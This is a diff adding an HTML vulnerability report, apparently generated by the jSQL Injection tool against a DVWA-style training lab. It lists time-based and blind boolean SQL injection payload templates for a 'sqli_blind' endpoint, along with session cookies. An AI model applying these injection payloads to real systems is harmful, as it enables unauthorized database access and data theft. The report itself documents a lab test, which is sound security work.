@@ -1,0 +1,38 @@
+<html>
+  <head>
+    
+  </head>
+  <body>
+    <span style="white-space: nowrap"><font face="Ubuntu Mono"># Date: 
+    2026-03-13<br style="white-space: nowrap">
+    # Tested on: Windows 11 (10.0)<br style="white-space: nowrap">
+    # Tool: jSQL Injection v0.114 (<a href="https://github.com/ron190/jsql-injection">https://github.com/ron190/jsql-injection</a>)<br style="white-space: nowrap">
+    # Database: MySQL<br style="white-space: nowrap">
+<br style="white-space: nowrap">
+    ## Vulnerability summary</font></span><br>
+<br>
+<span><font color="rgb(83,148,236)">### Strategy: Time</font></span><br>
+<span><font color="rgb(128,128,128)">Method: </font></span>GET<br>
+<span><font color="rgb(128,128,128)">Path: </font></span>/vulnerabilities/sqli_blind/<br>
+<span><font color="rgb(128,128,128)">Query: </font></span>id=1010210212'and+if((<span><font color="rgb(41,153,153)">&lt;query&gt;</font></span>),1,sleep(5))--+-EcX3&amp;Submit=Submit<br>
+<span><font color="rgb(128,128,128)">Header: </font></span>Content-Type: 
+    text/plain<br>
+    Cookie: PHPSESSID=4mrcfutcnhj5e92a4fakbluod3; security=low<br>
+<br>
+<span><font color="rgb(83,148,236)">### Strategy: Blind bin</font></span><br>
+<span><font color="rgb(128,128,128)">Method: </font></span>GET<br>
+<span><font color="rgb(128,128,128)">Path: </font></span>/vulnerabilities/sqli_blind/<br>
+<span><font color="rgb(128,128,128)">Query: </font></span>id=1010210212'or(<span><font color="rgb(41,153,153)">&lt;query&gt;</font></span>)--+-syGr&amp;Submit=Submit<br>
+<span><font color="rgb(128,128,128)">Header: </font></span>Content-Type: 
+    text/plain<br>
+    Cookie: PHPSESSID=4mrcfutcnhj5e92a4fakbluod3; security=low<br>
+<br>
+<span><font color="rgb(83,148,236)">### Strategy: Blind bit</font></span><br>
+<span><font color="rgb(128,128,128)">Method: </font></span>GET<br>
+<span><font color="rgb(128,128,128)">Path: </font></span>/vulnerabilities/sqli_blind/<br>
+<span><font color="rgb(128,128,128)">Query: </font></span>id=1010210212'or(<span><font color="rgb(41,153,153)">&lt;query&gt;</font></span>)--+-A1xH&amp;Submit=Submit<br>
+<span><font color="rgb(128,128,128)">Header: </font></span>Content-Type: 
+    text/plain<br>
+    Cookie: PHPSESSID=4mrcfutcnhj5e92a4fakbluod3; security=low
+  </body>
+</html>
